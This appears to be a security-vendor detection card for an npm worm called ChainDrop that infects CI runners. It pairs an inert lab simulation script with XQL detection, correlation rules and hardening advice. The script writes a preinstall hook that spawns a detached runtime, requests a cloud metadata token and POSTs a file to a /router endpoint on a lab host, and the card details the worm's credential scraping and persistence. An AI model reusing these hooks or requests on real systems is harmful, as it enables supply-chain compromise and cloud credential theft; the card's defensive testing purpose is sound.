identity.name: ChainDrop npm Worm — CI-Runner Preinstall to Runner.Worker Scrape, IMDS Harvest, C2 Exfil and STS Reuse (T1195.002 / T1003.007 / T1552.005)
identity.summary: ChainDrop's npm preinstall launches setup.mjs and a detached runtime on math_init.js, scrapes Runner.Worker memory, harvests metadata, k8s and Terraform credentials, persists in .vscode/.claude and exfiltrates to /router. The card validates that endpoint, NGFW and CloudTrail signals stitch into one incident on the runner.
identity.description: Unit 42 (2026-08-06) analysed ChainDrop, a self-propagating npm worm in the Shai-Hulud lineage. An infected package adds a preinstall entry that runs the setup.mjs dropper; the dropper finds or fetches Bun and feeds it the obfuscated math_init.js payload, which relaunches itself detached with _NODE_RUNTIME_INIT=1 (inline inside CI). The payload uses an embedded Python helper to read /proc/<pid>/maps and /proc/<pid>/mem of the Runner.Worker process for OIDC tokens and runner secrets, queries metadata and token endpoints for temporary IAM role credentials, takes Kubernetes service-account tokens, kubeconfigs and Terraform state, persists through .vscode/tasks.json (folderOpen) and .claude/settings.json (SessionStart hook), and ships a gzip + AES-256-GCM bundle with an RSA-OAEP-wrapped key to /router on an Ethereum-contract-resolved C2 (npm-cache.com, rotated to awqhnjewqjkl.icu on Aug. 4). SIM-MP-028 reproduces the lineage with a local inert package, a decoy Runner.Worker, staged credential files and lab-only network targets (AES-256-CBC stands in for GCM, which openssl enc lacks), and pairs it with NGFW threat/traffic records carrying the published hashes, both C2 domains and the rotated domain's two IPs and a CloudTrail STS record from the runner's address. CR-MP-0028 fuses the three legs on src_host.

execution.framework_reference_id: SIM-MP-028 — ChainDrop npm worm CI-runner to cloud stitched chain

prerequisites.description: Cortex XDR agent on the Linux CI runner / container host, with node, npm, python3 and openssl present.
NGFW threat + traffic and AWS CloudTrail ingestion reach the tenant (or the operator collector) so panw_ngfw_threat_raw, panw_ngfw_traffic_raw and cloud_audit_logs are populated.

payload.code:
# Inert ChainDrop lineage: local package, no report package installed, Bun never fetched.
set -u
W=/tmp/cortexsim-mp-028/pkg; mkdir -p "$W" /tmp/cortexsim-mp-028/run
printf '%s\n' '{"name":"cortexsim-mp028-inert","version":"0.0.1","private":true,"scripts":{"preinstall":"node setup.mjs"}}' > "$W/package.json"
printf '%s\n' "import { spawn } from 'node:child_process'; spawn(process.execPath, ['math_init.js'], { detached: true, stdio: 'ignore', env: { ...process.env, _NODE_RUNTIME_INIT: '1' } }).unref();" > "$W/setup.mjs"
printf '%s\n' "require('fs').writeFileSync('/tmp/cortexsim-mp-028/run/math_init.ran', String(process.pid));" > "$W/math_init.js"
(cd "$W" && npm install --no-audit --no-fund --offline --loglevel=error)
curl -s --max-time 2 -X PUT "http://${IMDS_HOST:-${STAGE_HOST:-127.0.0.1}}/latest/api/token" -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -o /dev/null
curl -s --max-time 3 -X POST --data-binary @/tmp/cortexsim-mp-028/run/math_init.ran "http://${STAGE_HOST:-127.0.0.1}/router" -o /dev/null

input_variables.name: STAGE_HOST
input_variables.description: Lab-controlled host that receives the metadata-shape requests and the /router POST.

input_variables.name: IMDS_HOST
input_variables.description: Unset by default. Only when the operator sets it does the metadata read reach that host (e.g. a real metadata service in an authorised lab).

biocs.name: MP-028 npm preinstall node setup.mjs spawns detached runtime with NODE_RUNTIME_INIT
biocs.description: npm runs a preinstall script whose node child executes setup.mjs and spawns a second JavaScript runtime (node or bun) on math_init.js with _NODE_RUNTIME_INIT=1 in its environment.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name in ("npm", "npm-cli.js", "node")
| filter action_process_image_name in ("node", "bun")
| filter action_process_image_command_line contains "math_init.js" or action_process_image_command_line contains "Math_Symbol.js" or action_process_image_command_line contains "setup.mjs"
| fields agent_hostname, causality_actor_process_image_name, actor_process_image_command_line, action_process_image_command_line

biocs.name: MP-028 proc pid mem read of Runner.Worker process
biocs.description: A process that is not a debugger opens /proc/<pid>/maps and /proc/<pid>/mem where <pid> belongs to Runner.Worker — the CI memory scrape for OIDC tokens and masked secrets.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and action_file_path ~= "^/proc/[0-9]+/(mem|maps)$"
| filter actor_process_image_name not in ("gdb", "lldb", "strace")
| join type = inner (dataset = xdr_data | filter event_type = ENUM.PROCESS and action_process_image_name = "Runner.Worker" | alter target_pid = to_string(action_process_os_pid) | fields agent_hostname, target_pid) as rw rw.agent_hostname = agent_hostname
| filter action_file_path in (concat("/proc/", rw.target_pid, "/mem"), concat("/proc/", rw.target_pid, "/maps"))
| fields agent_hostname, actor_process_image_name, actor_process_image_command_line, action_file_path

biocs.name: MP-028 npm lineage queries instance metadata token and IAM credentials endpoints
biocs.description: A child process started under an npm or node causality actor carries a metadata token PUT (/latest/api/token) or an iam/security-credentials GET in its command line. Keyed on the child's command-line URI and the lineage, so it fires whether the target is the real metadata address or a lab stand-in.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name in ("npm", "node", "bun")
| filter action_process_image_command_line contains "/latest/api/token" or action_process_image_command_line contains "/latest/meta-data/iam/security-credentials"
| fields agent_hostname, causality_actor_process_image_name, actor_process_image_command_line, action_process_image_command_line

biocs.name: MP-028 vscode tasks folderOpen and claude SessionStart hook persistence written
biocs.description: A node-lineage process writes .vscode/tasks.json and .claude/settings.json whose commands launch node setup.mjs — the ChainDrop developer-tooling persistence pair.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_WRITE, ENUM.FILE_CREATE_NEW)
| filter action_file_path contains "/.vscode/tasks.json" or action_file_path contains "/.claude/settings.json" or action_file_path contains "/.vscode/setup.mjs" or action_file_path contains "/.claude/setup.mjs"
| comp count_distinct(action_file_path) as files by agent_hostname, causality_actor_process_image_name
| filter files >= 2

biocs.name: MP-028 encrypted bundle POST to router URI from CI lineage
biocs.description: openssl pkeyutl with RSA-OAEP-SHA256 wraps a key, then a CI-lineage process POSTs an octet-stream body to a /router URI.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter (action_process_image_name = "openssl" and action_process_image_command_line contains "rsa_padding_mode:oaep") or (action_process_image_command_line contains "/router" and action_process_image_command_line contains "--data-binary")
| comp count_distinct(action_process_image_name) as stages by agent_hostname, causality_actor_process_image_name
| filter stages >= 2

abiocs.name: MP-028 CI runner large HTTPS upload to a rare domain
abiocs.description: NGFW EAL behavioural alert: a CI runner opens a first-seen HTTPS session and then a large outbound upload to a fleet-rare domain (awqhnjewqjkl.icu in this chain).
abiocs.logic:
dataset = panw_ngfw_traffic_raw
| filter app in ("ssl", "web-browsing") and dst_hostname != null
| comp sum(bytes_sent) as sent, count() as sessions by src, endpoint_device_name, dst_hostname
| filter sent >= 104857600
abiocs.causality_anchor: Learned per-host egress baseline -> first-seen destination plus outbound-volume deviation, anchored to src / endpoint_device_name.

abiocs.name: MP-028 STS AssumeRole from a CI runner address after metadata harvest
abiocs.description: An AssumedRole session calls sts:AssumeRole from an address that belongs to a CI runner which, minutes earlier, read the metadata token endpoint.
abiocs.logic:
dataset = cloud_audit_logs
| filter eventName = "AssumeRole" and eventSource = "sts.amazonaws.com" and userIdentity.type = "AssumedRole"
| alter caller_ip = sourceIPAddress, role_arn = userIdentity.arn
| join type = left (dataset = cloud_audit_logs | filter _time < to_timestamp(current_time() - 3600) and eventSource = "sts.amazonaws.com" and userIdentity.type = "AssumedRole" | comp count() as prior_calls by userIdentity.arn, sourceIPAddress | alter hist_arn = userIdentity.arn, hist_ip = sourceIPAddress | fields hist_arn, hist_ip, prior_calls) as hist hist.hist_arn = role_arn and hist.hist_ip = caller_ip
| filter prior_calls = null
| comp count() as calls by role_arn, caller_ip
abiocs.causality_anchor: Learned per-role caller-address baseline -> first-seen runner address, bridged to the endpoint by IP -> host asset resolution.

correlation_rules.name: ChainDrop npm worm — endpoint, NGFW and CloudTrail legs on one CI runner
correlation_rules.logic: (BIOC(MP-028 npm preinstall node setup.mjs spawns detached runtime with NODE_RUNTIME_INIT) OR BIOC(MP-028 proc pid mem read of Runner.Worker process) OR BIOC(MP-028 npm lineage queries instance metadata token and IAM credentials endpoints)) AND (IOC(file-sha256 ChainDrop) OR ABIOC(MP-028 CI runner large HTTPS upload to a rare domain) OR IOC(domain awqhnjewqjkl.icu) OR IOC(domain npm-cache.com)) AND ABIOC(MP-028 STS AssumeRole from a CI runner address after metadata harvest) within 1800s on the same src_host (endpoint alerts project agent_hostname; NGFW records carry endpoint_device_name and src; CloudTrail carries sourceIPAddress, resolved to the host by XSIAM asset IP->host mapping) -> one ChainDrop supply-chain incident.

threat_scenarios.name: ChainDrop npm Worm — CI Runner to Cloud
threat_scenarios.description: A poisoned npm dependency runs on a CI runner, steals runner and cloud credentials, persists in developer tooling and exfiltrates to its C2; the SOC sees one incident across endpoint, network and cloud.

threat_steps.objective: Endpoint lineage, NGFW indicator matches and the STS call all fire for the same runner.
success_criteria: The npm-lineage BIOCs fire on the runner.
WildFire verdicts and C2 sessions carry the runner's src_host.
STS AssumeRole from the runner's address raises the CDR alert.

threat_steps.objective: CR-MP-0028 fuses the three legs into one incident and Unit 42 enrichment names ChainDrop.
steps: Open the incident for the runner's host.
success_criteria: Exactly one incident contains EDR, NDR and CDR alerts.
The hashes, domains and IPs are tagged ChainDrop.

preventive_controls: Run npm ci with --ignore-scripts in CI unless a package is allow-listed to run lifecycle scripts.
Require IMDSv2 with hop limit 1 on runner hosts and scope runner IAM roles to the job.
Use short-lived, audience-restricted OIDC tokens and do not serialise toJSON(secrets) in workflows.
Block the published ChainDrop domains at DNS Security / URL filtering; match on domain or SNI, not the shared Cloudflare IPs.
detection_engineering: Alert on /proc/<pid>/mem reads of Runner.Worker by any non-debugger process.
Alert on writes of .vscode/tasks.json with runOn folderOpen and .claude/settings.json hooks outside developer workstations.
Correlate metadata token-endpoint reads on a runner with STS calls from that runner's address.
